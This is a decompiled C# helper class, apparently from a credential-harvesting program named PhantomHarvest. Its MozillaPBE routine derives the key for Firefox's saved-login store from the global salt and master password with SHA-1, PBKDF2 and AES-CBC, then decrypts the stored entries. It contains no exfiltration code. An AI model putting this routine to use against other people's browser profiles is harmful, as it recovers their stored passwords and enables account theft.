using System;
using System.Security.Cryptography;

namespace PhantomHarvest.Helper
{
	// Token: 0x0200002B RID: 43
	public class MozillaPBE
	{
		// Token: 0x1700001F RID: 31
		// (get) Token: 0x0600011D RID: 285 RVA: 0x0000AC38 File Offset: 0x00008E38
		// (set) Token: 0x0600011E RID: 286 RVA: 0x0000AC40 File Offset: 0x00008E40
		private byte[] cipherText { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x0600011F RID: 287 RVA: 0x0000AC49 File Offset: 0x00008E49
		// (set) Token: 0x06000120 RID: 288 RVA: 0x0000AC51 File Offset: 0x00008E51
		private byte[] GlobalSalt { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000121 RID: 289 RVA: 0x0000AC5A File Offset: 0x00008E5A
		// (set) Token: 0x06000122 RID: 290 RVA: 0x0000AC62 File Offset: 0x00008E62
		private byte[] MasterPassword { get; set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x06000123 RID: 291 RVA: 0x0000AC6B File Offset: 0x00008E6B
		// (set) Token: 0x06000124 RID: 292 RVA: 0x0000AC73 File Offset: 0x00008E73
		private byte[] EntrySalt { get; set; }

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000125 RID: 293 RVA: 0x0000AC7C File Offset: 0x00008E7C
		// (set) Token: 0x06000126 RID: 294 RVA: 0x0000AC84 File Offset: 0x00008E84
		public byte[] partIV { get; private set; }

		// Token: 0x06000127 RID: 295 RVA: 0x0000AC8D File Offset: 0x00008E8D
		public MozillaPBE(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt, byte[] partIV)
		{
			this.cipherText = cipherText;
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
			this.partIV = partIV;
		}

		// Token: 0x06000128 RID: 296 RVA: 0x0000ACBC File Offset: 0x00008EBC
		public byte[] Compute()
		{
			int iterations = 1;
			int count = 32;
			byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
			Buffer.BlockCopy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
			Buffer.BlockCopy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
			byte[] password = new SHA1Managed().ComputeHash(array);
			byte[] array2 = new byte[]
			{
				4,
				14
			};
			byte[] array3 = new byte[array2.Length + this.partIV.Length];
			Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
			Buffer.BlockCopy(this.partIV, 0, array3, array2.Length, this.partIV.Length);
			byte[] bytes = new Pbkdf2(new HMACSHA256(), password, this.EntrySalt, iterations).GetBytes(count);
			return new AesManaged
			{
				Mode = CipherMode.CBC,
				BlockSize = 128,
				KeySize = 256,
				Padding = PaddingMode.Zeros
			}.CreateDecryptor(bytes, array3).TransformFinalBlock(this.cipherText, 0, this.cipherText.Length);
		}
	}
}
